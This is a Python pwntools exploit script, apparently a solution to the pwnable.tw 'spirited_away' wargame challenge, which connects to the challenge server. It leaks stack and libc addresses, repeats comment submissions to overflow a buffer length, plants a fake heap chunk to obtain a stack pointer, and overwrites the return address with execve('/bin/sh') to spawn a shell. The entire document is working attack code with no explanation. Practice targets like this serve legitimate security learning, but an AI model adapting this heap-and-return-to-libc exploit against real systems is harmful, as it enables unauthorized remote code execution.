from pwn import *
elf = ELF("./spirited_away")
libc = ELF("./libc_32.so.6")
context.binary=elf
target=remote('chall.pwnable.tw',10204)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def leaks(name="A",reason="A",comment="A",option='y',age='1'):
	sa("name: ",name)
	sla("age: ",age)
	sa("movie? ",reason)
	sa("comment: ",comment)
	target.recvuntil("Reason: ")
	leak=target.recvline().strip("\n")
	sa("<y/n>: ",option)
	return leak

def attack(name="A",reason="A",comment="A",option='y',age='1'):
	sa("\nPlease enter your name: ",name)
	sla("Please enter your age: ",age)
	sa("Why did you came to see this movie? ",reason)
	sa("Please enter your comment: ",comment)
	sa("Would you like to leave another comment? <y/n>: ",option)

def attack2(name="A",reason="A",comment="A",option='y',age='1'):
	sla("Please enter your age: ",age)
	sa("Why did you came to see this movie? ",reason)
	sa("Would you like to leave another comment? <y/n>: ",option)
	
leak=leaks("A","A"*0x50,"A")
ebp=u32(leak[0x50:0x54])-0x20
libc_base=u32(leak[0x58:0x5c])-0x1b0d60
libc_execve=libc_base+libc.symbols["execve"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
for i in range(9):
	attack()
for i in range(99-9):
	attack2()
fakechunk=p32(0)+p32(0x41)+p32(0x21)*(0x48/4)
attack("A",fakechunk,"A"*0x54+p32(ebp-0x48))
payload="1"*0x4c+p32(libc_execve)*2+p32(libc_binsh)+p32(0)*2
attack(payload,"1","1",'n','1')
target.interactive()
